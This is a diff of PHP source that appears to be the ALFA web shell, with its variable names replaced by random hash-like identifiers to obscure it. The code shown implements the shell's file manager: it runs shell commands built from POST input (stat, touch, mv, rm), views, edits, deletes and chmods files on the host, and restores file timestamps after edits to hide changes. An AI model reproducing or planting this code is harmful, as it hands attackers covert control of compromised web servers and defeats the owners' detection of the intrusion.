+echo '<tr class="fmanager-row" id="tr_row_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" class="chkbx" id="'.$kayboipx9fced129522f128b2445a41fb0b6ef9f .'"><label for="'.$kayboipx9fced129522f128b2445a41fb0b6ef9f .'"></label></div></td><td id="td_row_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<div style="'.$tpqopcpra1b01e734b573fca08eb1a65e6df9a38.'"><a row="'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" id="id_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" class="main_name" onclick="'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?'editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\',\'auto\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" fname="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'].'" '.(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']."</span>":htmlspecialchars($xnetwpjf96704c6e6d422933503bdc9586e164bf)):'g(\'FilesMan\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['path'].'\');" href="#action=fileman&path='.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['path'].'" fname="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'].'" '.(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'[L] ':'').alfaSize($npviloqa8fa14cdd754f91cc6554c9e71929cce7['size']):$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['owner'].'/'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['group'].'</span></td><td><a id="id_chmode_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" href=javascript:void(0) onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\',\'chmod\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">'.
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7['perms'].'</td><td><a id="id_rename_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'rename\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">R</a> <a id="id_touch_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'touch\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">T</a>'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?' <a id="id_edit_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'edit\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">E</a> <a id="id_download_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\') : \'\';"> X </a></td></tr>';
+$rieuszxn2db95e8e1a9267b7a1188556b2013b33 = $rieuszxn2db95e8e1a9267b7a1188556b2013b33?0:1;
+$omusmjtke0323a9039add2978bf5b49550572c7c++;
 }
 echo "<tr id='filemanager_last_tr'><td colspan=7>
 <input type=hidden name=a value='FilesMan'>
@@ -2928,54 +3001,54 @@ echo "<tr id='filemanager_last_tr'><td colspan=7>
 <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
 <select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
 <input type='submit' value=' '>
-</form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
+</form></table><div class='pages-holder'><div class='pages-number'>".$nfqanqtl9020897dcdf7d2351efb0dcd6928eeb2."</div></div></div></div>";
 alfafooter();
 }
-function get_pagination_links($current_page, $total_pages){
-    $links = "";
-    if ($total_pages >= 1 && $current_page <= $total_pages) {
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
-		$selected_page = "";
-		if($current_page == 1){
-			$selected_page = " active-page-number";
+function get_pagination_links($fsfwxmea28707876df0831278a9529559e104f86, $dxnlohklae0fe0cc7e778fabf61f9217886eb31d){
+    $bkyhrdoy807765384d9d5527da8848df14a4f02f = "";
+    if ($dxnlohklae0fe0cc7e778fabf61f9217886eb31d >= 1 && $fsfwxmea28707876df0831278a9529559e104f86 <= $dxnlohklae0fe0cc7e778fabf61f9217886eb31d) {
+		$bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
+		$tknhrfzvb5dd22541781a81429693bb292129550 = "";
+		if($fsfwxmea28707876df0831278a9529559e104f86 == 1){
+			$tknhrfzvb5dd22541781a81429693bb292129550 = " active-page-number";
 		}
-        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
-        $i = max(2, $current_page - 5);
-        if ($i> 2)
-            $links .= "<a class=\"page-number\">...</a>";
-        for (; $i < min($current_page + 6, $total_pages); $i++) {
-			if($i == $current_page){
-				$selected_page = " active-page-number";
+        $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">1</a>";
+        $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = max(2, $fsfwxmea28707876df0831278a9529559e104f86 - 5);
+        if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741> 2)
+            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a class=\"page-number\">...</a>";
+        for (; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < min($fsfwxmea28707876df0831278a9529559e104f86 + 6, $dxnlohklae0fe0cc7e778fabf61f9217886eb31d); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
+			if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 == $fsfwxmea28707876df0831278a9529559e104f86){
+				$tknhrfzvb5dd22541781a81429693bb292129550 = " active-page-number";
 			}else{
-				$selected_page = "";
+				$tknhrfzvb5dd22541781a81429693bb292129550 = "";
 			}
-            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
+            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">{$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741}</a>";
         }
-        if ($i != $total_pages)
-            $links .= "<a class=\"page-number\">...</a>";
-		$selected_page = " last-page-number";
-		if($current_page == $total_pages){
-			$selected_page .= " active-page-number";
+        if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 != $dxnlohklae0fe0cc7e778fabf61f9217886eb31d)
+            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a class=\"page-number\">...</a>";
+		$tknhrfzvb5dd22541781a81429693bb292129550 = " last-page-number";
+		if($fsfwxmea28707876df0831278a9529559e104f86 == $dxnlohklae0fe0cc7e778fabf61f9217886eb31d){
+			$tknhrfzvb5dd22541781a81429693bb292129550 .= " active-page-number";
 		}
-        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
+        $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">{$dxnlohklae0fe0cc7e778fabf61f9217886eb31d}</a>";
+		$bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
     }
-    return $links;
+    return $bkyhrdoy807765384d9d5527da8848df14a4f02f;
 }
 function alfaFilesTools(){
 alfahead();
 echo '<div class="filestools" style="height: 100%;">';
 if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
-$alfa1_decoded = $_POST['alfa1'];
-$chdir_fals = false;
+$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584 = $_POST['alfa1'];
+$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = false;
 if(!@chdir($_POST['c'])){
-	$chdir_fals = true;
+	$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = true;
 	$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
-	$alfa_canruncmd = _alfa_can_runCommand(true,true);
-	if($alfa_canruncmd){
-		$slashed_alfa1 = addslashes($_POST['alfa1']);
-		$file_info = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
-		$perm_color_class = alfaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
+	$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
+	if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+		$avpzwwrjd63ca887e627bddccd346962a3573132 = addslashes($_POST['alfa1']);
+		$hpqpacum080505fba0c91df9d7cff41d972acaf1 = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$avpzwwrjd63ca887e627bddccd346962a3573132.'"'));
+		$wmjcghfrc0dbf420423102c20ba84dd9b0e049c2 = alfaEx("if [[ -w '".$avpzwwrjd63ca887e627bddccd346962a3573132."' ]]; then echo main_green_perm; elif [[ -r '".$avpzwwrjd63ca887e627bddccd346962a3573132."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
 	}
 }
 if($_POST['alfa2'] == 'auto'){
@@ -2983,12 +3056,12 @@ if(is_array(@getimagesize($_POST['alfa1']))){
 $_POST['alfa2'] = 'image';
 }else{
 	$_POST['alfa2'] = 'view';
-	if($chdir_fals){
-		if($alfa_canruncmd){
-			$mime = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
-			$mimetype = $mime[1];
-			if(!empty($mimetype)){
-				if(strstr($mimetype, "image")){
+	if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
+		if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+			$allbrbted02a169f33469c888396a24dd9d9f1c6 = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
+			$oseogflpdef87f6eeed2542b0b6581a4d278c577 = $allbrbted02a169f33469c888396a24dd9d9f1c6[1];
+			if(!empty($oseogflpdef87f6eeed2542b0b6581a4d278c577)){
+				if(strstr($oseogflpdef87f6eeed2542b0b6581a4d278c577, "image")){
 					$_POST['alfa2'] = 'image';
 				}
 			}
@@ -2996,20 +3069,20 @@ $_POST['alfa2'] = 'image';
 	}
 }
 }
-if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$rename_cache = $_POST['alfa3'];}
+if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$pjsnqejl3707515996ae70bff801cd4bce3d80e2 = $_POST['alfa3'];}
 if(@$_POST['alfa2'] == 'mkfile'){
 $_POST['alfa1'] = trim($_POST['alfa1']);
-if($chdir_fals&&$alfa_canruncmd){
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 	if(_alfa_is_writable($_POST["c"])){
-		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($alfa1_decoded)."'");
+		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
 		$_POST['alfa2'] = "edit";
 	}
 }
 if(!@file_exists($_POST['alfa1'])){
-$fp = @fopen($_POST['alfa1'], 'w');
-if($fp){
+$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fopen($_POST['alfa1'], 'w');
+if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
 $_POST['alfa2'] = "edit";
-fclose($fp);
+fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
 }
 }else{
 $_POST['alfa2'] = "edit";
@@ -3020,70 +3093,70 @@ echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST
 alfaFooter();
 return;
 }
-if($chdir_fals){
-$filesize = $file_info[3];
-$uid["name"] = $file_info[1];
-$gid["name"] = $file_info[2];
-$permcolor = alfaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
+$cgdmagdy11b4278c7e5a79003db77272c1ed2cf5 = $hpqpacum080505fba0c91df9d7cff41d972acaf1[3];
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048["name"] = $hpqpacum080505fba0c91df9d7cff41d972acaf1[1];
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c["name"] = $hpqpacum080505fba0c91df9d7cff41d972acaf1[2];
+$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2 = alfaPermsColor(array("class"=>$wmjcghfrc0dbf420423102c20ba84dd9b0e049c2,"num"=>$hpqpacum080505fba0c91df9d7cff41d972acaf1[5],"human"=>$hpqpacum080505fba0c91df9d7cff41d972acaf1[6]),true);
 }else{
-$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
-$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
-if(!$uid&&!$gid){
-$uid['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
-$gid['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
+if(!$uwdmfmmt9871d3a2c554b27151cacf1422eec048&&!$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c){
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
 }
-$permcolor = alfaPermsColor($_POST['alfa1']);
-$filesize = @filesize($_POST['alfa1']);
-if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
+$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2 = alfaPermsColor($_POST['alfa1']);
+$cgdmagdy11b4278c7e5a79003db77272c1ed2cf5 = @filesize($_POST['alfa1']);
+if(!isset($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'],$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'])||empty($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'])||empty($zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'])){
 	if(_alfa_can_runCommand()){
-		list($uid['name'],$gid['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
+		list($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'],$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
 	}
 }
 }
 if(substr($_POST['alfa1'], 0, 7) == "phar://"){
-	$alfa_file_directory = $_POST['alfa1'];
+	$cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8 = $_POST['alfa1'];
 }else{
-	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
+	$cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8 = str_replace("//", "/",($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772?"":$_POST['c'].'/').$_POST['alfa1']);
 }
-echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($alfa_file_directory).'</div>';
+echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($cgdmagdy11b4278c7e5a79003db77272c1ed2cf5).' <span class="editor_file_info_vars">Permission:</span> '.$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'].'/'.$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8).'</div>';
 if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
 if(!_alfa_is_dir($_POST['alfa1'])){
-$m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
-$ftype = "file";
+$cnspfppq6f8f57715090da2632453988d9a1501b = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
+$yvdtggga39bb421562d6f6128a957f3d162538d2 = "file";
 }else{
-$m = array('Chmod', 'Rename', 'Touch');
-$ftype = "dir";
+$cnspfppq6f8f57715090da2632453988d9a1501b = array('Chmod', 'Rename', 'Touch');
+$yvdtggga39bb421562d6f6128a957f3d162538d2 = "dir";
 }
 echo('<div>');
-foreach($m as $v)
-echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
+foreach($cnspfppq6f8f57715090da2632453988d9a1501b as $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)
+echo $hvlrcxnj9e3669d19b675bd57058fd4664205d2a == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($pjsnqejl3707515996ae70bff801cd4bce3d80e2)?$_POST['alfa1']:$pjsnqejl3707515996ae70bff801cd4bce3d80e2).'\',\''.strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\'):\'\';"><span class="editor_actions">'.((strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.' </span> </b>':$hvlrcxnj9e3669d19b675bd57058fd4664205d2a).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($pjsnqejl3707515996ae70bff801cd4bce3d80e2)?$_POST['alfa1']:$pjsnqejl3707515996ae70bff801cd4bce3d80e2).'\',\''.strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\')"><span class="editor_actions">'.((strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.' </span> </b>':$hvlrcxnj9e3669d19b675bd57058fd4664205d2a).' | </span></a>';
 echo '</div>';
 switch($_POST['alfa2']){
 case 'view':case 'edit':
 @chdir($_POST['c']);
-$disabled_btn = "";
+$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af = "";
 if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
-$disabled_btn = "disabled=disabled";
-$disabled_btn_style= 'background: #ff0000;color: #fff;';
+$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af = "disabled=disabled";
+$lczrrili2aed9dafbee823ceb8d8a93b93362da3= 'background: #ff0000;color: #fff;';
 }
 if(!empty($_POST['alfa3'])){
 $_POST['alfa3'] = substr($_POST['alfa3'],1);
-$time = @filemtime($_POST['alfa1']);
-$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
-if($chdir_fals&&$alfa_canruncmd){
-	$rname = $alfa1_decoded;
-	$randname = $rname.rand(111,9999);
-	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
-	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
-		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
+$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = @filemtime($_POST['alfa1']);
+$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @__write_file($_POST['alfa1'],$_POST['alfa3']);
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+	$bqrminekc626d8954194dd0136691c301dcf7ece = $qdtibsqye1811c0c73fb371dc3b92d7bbabfc584;
+	$nljvfvfm1169f7b37065619357fee6e3b71c8376 = $bqrminekc626d8954194dd0136691c301dcf7ece.rand(111,9999);
+	$rabzzsbu6a2a431fe8b621037ea949531c28551d = dirname($_SERVER["SCRIPT_FILENAME"])."/".$nljvfvfm1169f7b37065619357fee6e3b71c8376;
+	if($zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @__write_file($rabzzsbu6a2a431fe8b621037ea949531c28551d ,$_POST['alfa3'])){
+		alfaEx("mv '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."'");
 	}
 }
-if($fp){
+if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
 echo 'Saved!<br>';
-@touch($_POST['alfa1'],$time,$time);
+@touch($_POST['alfa1'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b);
 }
 }
-echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($alfa1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
+echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$lczrrili2aed9dafbee823ceb8d8a93b93362da3.'" '.$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af.'>save</button></div><pre class="ml1 view_ml_content">';
 echo htmlspecialchars(__read_file($_POST['alfa1']));
 echo '</pre></div></div>';
 break;
@@ -3091,34 +3164,34 @@ case 'highlight':
 @chdir($_POST['c']);
 if(@is_readable($_POST['alfa1'])){
 echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
-$code = @highlight_file($_POST['alfa1'],true);
-echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = @highlight_file($_POST['alfa1'],true);
+echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$nndigmblc13367945d5d4c91047b3b50234aa7ab).'</div></div></div>';
 }
 break;
 case 'delete':
 @chdir($_POST['c']);
 if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
-$deleted = true;
+$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = true;
 if(!@unlink($_POST['alfa1'])){
-	$deleted = false;
-	if($alfa_canruncmd){
+	$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = false;
+	if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 		if(_alfa_is_writable($_POST['alfa1'])){
 			alfaEx("rm -f '".addslashes($_POST['alfa1'])."'");
-			$deleted = true;
+			$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = true;
 		}
 	}
 }
-if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
+if($jpylscqwda602f0b162fccbf6b150cfcfc7a7379)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
 break;
 case 'chmod':
 @chdir($_POST['c']);
 if(!empty($_POST['alfa3'])){
-$perms = 0;
-for($i=strlen($_POST['alfa3'])-1;$i>=0;--$i)
-$perms += (int)$_POST['alfa3'][$i]*pow(8, (strlen($_POST['alfa3'])-$i-1));
